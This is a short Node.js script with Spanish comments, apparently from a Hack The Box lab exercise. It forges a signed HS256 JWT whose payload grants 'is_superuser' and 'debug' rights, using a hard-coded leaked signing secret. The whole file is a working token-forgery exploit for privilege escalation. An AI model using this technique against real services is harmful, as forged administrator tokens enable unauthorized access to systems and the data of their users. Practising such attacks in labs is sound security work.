import crypto from 'node:crypto';

// Función para codificar objetos en Base64URL
const base64urlEncode = (obj) =>
  Buffer.from(JSON.stringify(obj))
    .toString('base64')
    .replace(/=/g, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');

// Header y Payload
const header = {
  alg: 'HS256',
  typ: 'JWT'
};

const payload = {
  "type": "access_token",
  "exp": 1751091457,
  "iat": 1750400257,
  "sub": "1",
  "debug": true,
  "is_superuser": true,
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284"
}

const secret = 'SuperSecretSigningKey-HTB';

// Codificar header y payload
const encodedHeader = base64urlEncode(header);
const encodedPayload = base64urlEncode(payload);

// Concatenar los dos para formar la parte a firmar
const data = `${encodedHeader}.${encodedPayload}`;

// Firmar usando HMAC-SHA256
const signature = crypto
  .createHmac('sha256', secret)
  .update(data)
  .digest('base64')
  .replace(/=/g, '')
  .replace(/\+/g, '-')
  .replace(/\//g, '_');

// Construir el JWT completo
const jwt = `${data}.${signature}`;

console.log('JWT generado:\n', jwt);

